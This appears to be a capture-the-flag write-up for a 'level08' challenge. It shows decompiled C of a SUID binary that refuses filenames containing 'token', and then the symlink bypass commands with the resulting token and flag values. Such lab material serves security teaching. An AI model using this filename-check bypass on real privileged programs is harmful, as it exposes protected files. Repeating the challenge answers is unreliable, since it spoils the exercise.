Another 32 bits elf executable (SUID bit also set):
```C
08048554    int32_t main(int32_t argc, char** argv, char** envp)

08048554    {
08048554        char** envp_1 = envp;
0804856e        void* gsbase;
0804856e        int32_t eax_2 = *(uint32_t*)((char*)gsbase + 20);
0804856e        
08048581        if (argc == 1)
08048581        {
080485ba            printf("%s [file to read]\n", *(uint32_t*)argv);
080485a1            exit(1);
08048581        }
08048581        
080485c1        if (strstr(argv[1], "token"))
080485c1        {
080485fd            printf("You may not access '%s'\n", argv[1]);
080485e4            exit(1);
080485c1        }
080485c1        
080485fd        int32_t fd = open(argv[1], 0);
080485fd        
0804860b        if (fd == 0xffffffff)
0804860b        {
08048645            err(1, "Unable to open %s", argv[1]);
0804860b        }
0804860b        
08048645        void buf;
08048645        ssize_t nbytes = read(fd, &buf, 1024);
08048645        
08048653        if (nbytes == 0xffffffff)
08048653        {
08048688            err(1, "Unable to read fd %d", fd);
08048653        }
08048653        
08048688        ssize_t result = write(1, &buf, nbytes);
08048688        
0804869b        if (eax_2 == *(uint32_t*)((char*)gsbase + 20))
080486a3            return result;
08048554    }
```

\- The program reads the content for a file and prints it on STDOUT. But it cannot read a file that contains the word "token"

\- So the script has the SUID bits set and executes with flag08 privileges. So permissions is not a problem anymore.

\- Now we have to bypass the strstr(argv[1], "token") condition.

Let's make a symlink to the token file without the token in his name:

```bash
> ln -s ~/token /tmp/bypass

> ./level08 /tmp/bypass
Token: quif5eloekouj29ke0vouxean

> su level09

> getflag
25749xKZ8L7DkSCwJkT9dyv6f
```

*25749xKZ8L7DkSCwJkT9dyv6f*